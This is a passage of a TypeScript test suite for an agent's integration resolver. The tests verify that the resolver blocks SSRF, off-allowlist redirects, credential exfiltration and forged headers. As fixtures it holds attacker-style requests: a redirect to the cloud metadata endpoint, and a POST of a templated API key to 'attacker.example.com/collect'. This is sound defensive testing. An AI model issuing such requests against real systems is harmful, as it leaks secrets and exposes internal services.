    it(`refuses SSRF-blocked target ${target} before any outbound fetch`, async () => {
      let fetched = false;
      const root = makePackage("@acme/agent", "1.0.0", "agent", {});
      const bundle = makeBundle(root, [allowAllManifest("@acme/api")]);
      const resolver = new LocalIntegrationResolver({
        resolveHost: async () => ["203.0.113.7"],
        creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
        fetch: (() => {
          fetched = true;
          return Promise.resolve(new Response("{}", { status: 200 }));
        }) as unknown as typeof fetch,
      });
      const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
      const { ctx } = makeCtx();
      await expect(tools[0]!.execute({ method: "GET", target }, ctx)).rejects.toThrow(
        /blocked network range/,
      );
      // No outbound bytes — the SSRF preflight fires before fetch.
      expect(fetched).toBe(false);
    });
  }

  it("follows a same-host redirect and returns the terminal response", async () => {
    const seen: string[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const bundle = makeBundle(root, [
      narrowAllowlistManifest("@acme/api", ["https://api.acme.com/**"]),
    ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: ((url: string) => {
        seen.push(url);
        if (url === "https://api.acme.com/v1/old") {
          return Promise.resolve(
            new Response(null, {
              status: 302,
              headers: { location: "https://api.acme.com/v1/new" },
            }),
          );
        }
        return Promise.resolve(
          new Response(JSON.stringify({ ok: true }), {
            status: 200,
            headers: { "content-type": "application/json" },
          }),
        );
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    const res = await tools[0]!.execute(
      { method: "GET", target: "https://api.acme.com/v1/old" },
      ctx,
    );
    // The follower chased the 302 to the final 200.
    expect(seen).toEqual(["https://api.acme.com/v1/old", "https://api.acme.com/v1/new"]);
    const body = JSON.parse((res.content[0] as { text: string }).text) as { status: number };
    expect(body.status).toBe(200);
  });

  it("refuses a redirect hop that leaves the authorized_uris allowlist", async () => {
    const seen: string[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const bundle = makeBundle(root, [
      narrowAllowlistManifest("@acme/api", ["https://api.acme.com/**"]),
    ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: ((url: string) => {
        seen.push(url);
        // First (allowed) hop redirects OFF the allowlist to an attacker host.
        return Promise.resolve(
          new Response(null, {
            status: 302,
            headers: { location: "https://evil.attacker.com/steal" },
          }),
        );
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await expect(
      tools[0]!.execute({ method: "GET", target: "https://api.acme.com/v1/me" }, ctx),
    ).rejects.toThrow(/redirect blocked/i);
    // Only the initial (allowed) hop was issued — the off-allowlist hop
    // was refused before re-issuing the fetch.
    expect(seen).toEqual(["https://api.acme.com/v1/me"]);
  });

  it("refuses a redirect hop pointing at an SSRF-blocked target (allow_all_uris)", async () => {
    const seen: string[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const bundle = makeBundle(root, [allowAllManifest("@acme/api")]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: ((url: string) => {
        seen.push(url);
        // Public first hop redirects to the cloud metadata endpoint — the
        // classic SSRF-via-redirect pivot. allow_all_uris must NOT permit it.
        return Promise.resolve(
          new Response(null, {
            status: 302,
            headers: { location: "http://169.254.169.254/latest/meta-data/" },
          }),
        );
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await expect(
      tools[0]!.execute({ method: "GET", target: "https://public.example.com/start" }, ctx),
    ).rejects.toThrow(/redirect blocked/i);
    expect(seen).toEqual(["https://public.example.com/start"]);
  });

  it("holds an injected credential to authorized_uris under allow_all_uris, and refuses without one", async () => {
    for (const [authorizedUris, error] of [
      [["https://api.acme.com/**"], /not in authorized_uris allowlist/],
      [[], /no authorized_uris allowlist that names its hosts/],
    ] as const) {
      let fetched = 0;
      const root = makePackage("@acme/agent", "1.0.0", "agent", {});
      const manifest = apiKeyIntegrationManifest("@acme/api", {
        allowAllUris: true,
        authorizedUris: [...authorizedUris],
      });
      const bundle = makeBundle(root, [
        makePackage("@acme/api", "1.0.0", "integration", {
          "integration.json": JSON.stringify(manifest.integration),
        }),
      ]);
      const resolver = new LocalIntegrationResolver({
        resolveHost: async () => ["203.0.113.7"],
        creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
        fetch: (() => {
          fetched += 1;
          return Promise.resolve(new Response("{}", { status: 200 }));
        }) as unknown as typeof fetch,
      });
      const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
      const { ctx } = makeCtx();
      await expect(
        tools[0]!.execute({ method: "GET", target: "https://a.example.com/start" }, ctx),
      ).rejects.toThrow(error);
      expect(fetched).toBe(0);
    }
  });

  it("refuses a {{field}} credential substitution toward a PUBLIC host when allow_all_uris is the only permission", async () => {
    // Downgrading allowAllUris alone is not enough: with no authorized_uris
    // the preflight would fall back to the internal-host SSRF net and the
    // secret would still ship to any public attacker host. The resolver must
    // refuse outright — same semantics as the sidecar's 403.
    let fetched = 0;
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    // allow_all_uris with NO authorized_uris — the normal allow-all shape.
    const bundle = makeBundle(root, [
      makePackage("@acme/api", "1.0.0", "integration", {
        "integration.json": JSON.stringify(
          apiKeyIntegrationManifest("@acme/api", { allowAllUris: true, authorizedUris: [] })
            .integration,
        ),
      }),
    ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: (() => {
        fetched += 1;
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as unknown as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await expect(
      tools[0]!.execute(
        {
          method: "POST",
          target: "https://attacker.example.com/collect",
          body: "key={{api_key}}",
        },
        ctx,
      ),
    ).rejects.toMatchObject({ code: "RESOLVER_CREDENTIAL_EXFIL_BLOCKED" });
    expect(fetched).toBe(0); // refused before any outbound bytes
  });

  it("refuses a templated secret to another endpoint on a URL-valued field's origin", async () => {
    // Webhooks-like: allow_all_uris, no allowlist. A field's origin is often
    // shared by tenants (hooks.slack.com), so it never widens the allowlist.
    let fetched = 0;
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const bundle = makeBundle(root, [
      makePackage("@acme/hooks", "1.0.0", "integration", {
        "integration.json": JSON.stringify(
          apiKeyIntegrationManifest("@acme/hooks", { allowAllUris: true, authorizedUris: [] })
            .integration,
        ),
      }),
    ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: {
        version: 1,
        integrations: {
          "@acme/hooks": {
            fields: {
              webhook_url: "https://hooks.example.com/services/TVICTIM/x",
              secret_header_value: "S",
            },
          },
        },
      },
      fetch: (() => {
        fetched++;
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as unknown as typeof fetch,
    });
    const { ctx } = makeCtx();
    await expect(
      (await resolver.resolve([{ name: "@acme/hooks", version: "^1" }], bundle))[0]!.execute(
        {
          method: "POST",
          target: "https://hooks.example.com/services/TATTACKER/y",
          headers: { "X-Secret": "{{secret_header_value}}" },
        },
        ctx,
      ),
    ).rejects.toMatchObject({ code: "RESOLVER_CREDENTIAL_EXFIL_BLOCKED" });
    expect(fetched).toBe(0);
  });
});

describe("LocalIntegrationResolver — authorized_uris rendered per connection (#1627)", () => {
  async function toolFor(
    authorizedUris: string[],
    fields: Record<string, string>,
    resolveHost: () => Promise<string[]> = async () => ["203.0.113.7"],
  ) {
    const hits: string[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/wp", "1.0.0", "integration", {
      "integration.json": JSON.stringify(
        apiKeyIntegrationManifest("@acme/wp", { authorizedUris }).integration,
      ),
    });
    const resolver = new LocalIntegrationResolver({
      resolveHost,
      creds: { version: 1, integrations: { "@acme/wp": { fields: { api_key: "k", ...fields } } } },
      fetch: ((url: string) => {
        hits.push(url);
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as unknown as typeof fetch,
    });
    const tools = await resolver.resolve(
      [{ name: "@acme/wp", version: "^1" }],
      makeBundle(root, [integ]),
    );
    const { ctx } = makeCtx();
    const call = (target: string) =>
      tools[0]!.execute({ method: "GET", target, headers: { "X-Key": "{{api_key}}" } }, ctx);
    return { call, hits };
  }

  it("allows a templated call to the URL-form entry and refuses another host", async () => {
    const { call, hits } = await toolFor(["{$credential.site_url}/**"], {
      site_url: "https://wp.example.com",
    });
    await call("{{site_url}}/wp-json/x");
    expect(hits).toEqual(["https://wp.example.com/wp-json/x"]);
    await expect(call("https://other.example.com/wp-json/x")).rejects.toMatchObject({
      code: "AUTHORIZED_URIS_MISMATCH",
    });
    expect(hits).toHaveLength(1);
  });

  it("allows the authority form's host and refuses another", async () => {
    const { call, hits } = await toolFor(["https://{$credential.host}/**"], {
      host: "wp.example.com",
    });
    await call("https://{{host}}/wp-json/x");
    expect(hits).toEqual(["https://wp.example.com/wp-json/x"]);
    await expect(call("https://other.example.com/x")).rejects.toMatchObject({
      code: "AUTHORIZED_URIS_MISMATCH",
    });
  });

  it.each([
    [["{$credential.site_url}/**"], { site_url: "https://169.254.169.254" }, "{{site_url}}/latest"],
    [["https://{$credential.host}/**"], { host: "127.0.0.1" }, "https://{{host}}/admin"],
  ])("never pins a connection-supplied internal host (%j)", async (uris, fields, target) => {
    const { call, hits } = await toolFor(uris, fields);
    await expect(call(target)).rejects.toMatchObject({ code: "RESOLVER_URL_BLOCKED" });
    expect(hits).toEqual([]);
  });

  it("refuses every target when the auth declares no authorized_uris and not allow_all_uris", async () => {
    const hits: string[] = [];
    const integ = makePackage("@acme/wp", "1.0.0", "integration", {
      "integration.json": JSON.stringify(
        apiKeyIntegrationManifest("@acme/wp", { authorizedUris: [] }).integration,
      ),
    });
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      // No api_key: the call carries no credential, so only the empty allowlist refuses it.
      creds: { version: 1, integrations: { "@acme/wp": { fields: {} } } },
      fetch: ((url: string) => {
        hits.push(url);
        return Promise.resolve(new Response("{}"));
      }) as unknown as typeof fetch,
    });
    const tools = await resolver.resolve(
      [{ name: "@acme/wp", version: "^1" }],
      makeBundle(makePackage("@acme/agent", "1.0.0", "agent", {}), [integ]),
    );
    const err = await tools[0]!
      .execute({ method: "GET", target: "https://public.example/x" }, makeCtx().ctx)
      .catch((e: unknown) => e);
    expect(err).toMatchObject({ code: "AUTHORIZED_URIS_EMPTY" });
    expect(hits).toEqual([]);
  });

  it("refuses every target when the connection's URL does not render", async () => {
    const { call, hits } = await toolFor(["{$credential.site_url}/**"], { site_url: "mysite.com" });
    const err = await call("https://attacker.example/steal").catch((e: unknown) => e);
    expect(err).toMatchObject({ code: "AUTHORIZED_URIS_EMPTY" });
    expect((err as Error).message).toContain("does not render");
    expect(hits).toEqual([]);
  });

  it("an off-list refusal names the declared template, never the rendered secret URL", async () => {
    const hook = "https://hooks.example.com/services/T000/B000/SECRETTOKEN";
    const { call, hits } = await toolFor(["{$credential.webhook_url}"], { webhook_url: hook });
    const err = await call("https://example.com/").catch((e: unknown) => e);
    expect(err).toMatchObject({
      code: "AUTHORIZED_URIS_MISMATCH",
      details: { allowlist: ["{$credential.webhook_url}"] },
    });
    expect(JSON.stringify({ ...(err as object), message: (err as Error).message })).not.toContain(
      "SECRETTOKEN",
    );
    expect(hits).toEqual([]);
  });

  it("runs the DNS rebind check on a rendered host", async () => {
    const { call, hits } = await toolFor(
      ["https://{$credential.host}/**"],
      { host: "intranet.corp" },
      async () => ["10.0.0.5"],
    );
    await expect(call("https://{{host}}/x")).rejects.toMatchObject({
      code: "RESOLVER_URL_BLOCKED",
    });
    expect(hits).toEqual([]);
  });
});

describe("RemoteAppstrateIntegrationResolver", () => {
  it("POSTs to /api/credential-proxy/proxy with X-Integration-Id = integration id", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new RemoteAppstrateIntegrationResolver({
      instance: "https://app.appstrate.com",
      apiKey: "ask_test",
      spaceId: "spc_1",
      orgId: "org_1",
      sessionId: "sess_1",
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    expect(tools[0]!.name).toBe("acme_api__api_call");
    const { ctx } = makeCtx();
    await tools[0]!.execute({ method: "GET", target: "https://api.acme.com/v1/me" }, ctx);
    expect(calls[0]!.url).toBe("https://app.appstrate.com/api/credential-proxy/proxy");
    const h = new Headers(calls[0]!.init.headers);
    expect(h.get("Authorization")).toBe("Bearer ask_test");
    expect(h.get("X-Space-Id")).toBe("spc_1");
    expect(h.get("X-Org-Id")).toBe("org_1");
    expect(h.get("X-Integration-Id")).toBe("@acme/api");
    expect(h.get("X-Target")).toBe("https://api.acme.com/v1/me");
  });

  it("drops an agent-supplied X-Run-Id (any casing) but keeps X-Connection-Id", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new RemoteAppstrateIntegrationResolver({
      instance: "https://app.appstrate.com",
      apiKey: "ask_test",
      spaceId: "spc_1",
      extraHeaders: { "X-Run-Id": "run_real" },
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await tools[0]!.execute(
      {
        method: "GET",
        target: "https://api.acme.com/v1/me",
        headers: { "x-run-id": "run_forged", "X-Connection-Id": "conn_1" },
      },
      ctx,
    );
    const h = new Headers(calls[0]!.init.headers);
    // Not merged into "run_forged, run_real".
    expect(h.get("X-Run-Id")).toBe("run_real");
    expect(h.get("X-Connection-Id")).toBe("conn_1");
  });

  it("does not enforce authorizedUris locally (platform gates server-side)", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new RemoteAppstrateIntegrationResolver({
      instance: "https://app.appstrate.com",
      apiKey: "ask_test",
      spaceId: "spc_1",
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    // off-allowlist target — must NOT throw locally; proxy decides.
    await tools[0]!.execute({ method: "GET", target: "https://anything.example.com/x" }, ctx);
    expect(calls).toHaveLength(1);
    expect(new Headers(calls[0]!.init.headers).get("X-Target")).toBe(
      "https://anything.example.com/x",
    );
  });

  async function remoteTool(fetchImpl: typeof fetch): Promise<Tool> {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const resolver = new RemoteAppstrateIntegrationResolver({
      instance: "https://app.appstrate.com",
      apiKey: "ask_test",
      spaceId: "spc_1",
      fetch: fetchImpl,
    });
    const tools = await resolver.resolve(
      [{ name: "@acme/api", version: "^1" }],
      makeBundle(root, [integ]),
    );
    return tools[0]!;
  }

  it("applies the caller-header rule of fetchApiCall to the agent's headers", async () => {
    const calls: RequestInit[] = [];
    const tool = await remoteTool(((_url: string, init: RequestInit) => {
      calls.push(init);
      return Promise.resolve(new Response("{}", { status: 200 }));
    }) as typeof fetch);
    const { ctx } = makeCtx();
    await tool.execute(
      {
        method: "POST",
        target: "https://api.acme.com/v1/me",
        headers: {
          Host: "evil.example",
          Connection: "x-foo",
          "X-Foo": "bar",
          "Transfer-Encoding": "chunked",
          Upgrade: "websocket",
          "Proxy-Authorization": "Basic Zm9vOmJhcg==",
          "Content-Length": "3",
          "X-Max-Response-Size": "999999999",
          "X-Stream-Request": "1",
          "X-Custom": "kept",
        },
        body: "hello world",
      },
      ctx,
    );
    const h = new Headers(calls[0]!.headers);
    for (const name of [
      "host",
      "connection",
      "x-foo",
      "transfer-encoding",
      "upgrade",
      "proxy-authorization",
      "content-length",
      "x-max-response-size",
      "x-stream-request",
    ]) {
      expect(h.has(name)).toBe(false);
    }
    expect(h.get("X-Custom")).toBe("kept");
    expect(h.get("Authorization")).toBe("Bearer ask_test");
  });

  it("raises RESOLVER_HEADER_INVALID, unsent, on an agent header that is no HTTP field value", async () => {
    let calls = 0;
    const tool = await remoteTool((() => {
      calls += 1;
      return Promise.resolve(new Response("{}", { status: 200 }));
    }) as unknown as typeof fetch);
    const { ctx } = makeCtx();
    const call = tool.execute(
      { method: "GET", target: "https://api.acme.com/v1/me", headers: { "X-Custom": "a\u0001b" } },
      ctx,
    );
    await expect(call).rejects.toMatchObject({ code: "RESOLVER_HEADER_INVALID" });
    expect(calls).toBe(0);
  });

  it("sends a streamed file with its real Content-Length, never the agent's", async () => {
    const workspace = await realpath(await mkdtemp(join(tmpdir(), "afps-remote-stream-")));
    const size = STREAMING_THRESHOLD + 4096;
    await writeFile(join(workspace, "upload.bin"), new Uint8Array(size));
    const received: { contentLength: string | null; bytes: number }[] = [];
    const server = Bun.serve({
      port: 0,
      async fetch(request) {
        const bytes = (await request.arrayBuffer()).byteLength;
        received.push({ contentLength: request.headers.get("content-length"), bytes });
        return new Response("{}", { status: 200 });
      },
    });
    try {
      const tool = await remoteTool(((_url: string, init: RequestInit) =>
        fetch(`http://127.0.0.1:${server.port}/api/credential-proxy/proxy`, init)) as typeof fetch);
      const { ctx } = makeCtx();
      await tool.execute(
        {
          method: "POST",
          target: "https://api.acme.com/v1/upload",
          headers: { "Content-Length": "5" },
          body: { fromFile: "upload.bin" },
        },
        { ...ctx, workspace },
      );
      expect(received).toEqual([{ contentLength: String(size), bytes: size }]);
    } finally {
      server.stop(true);
      await rm(workspace, { recursive: true, force: true });
    }
  });
});
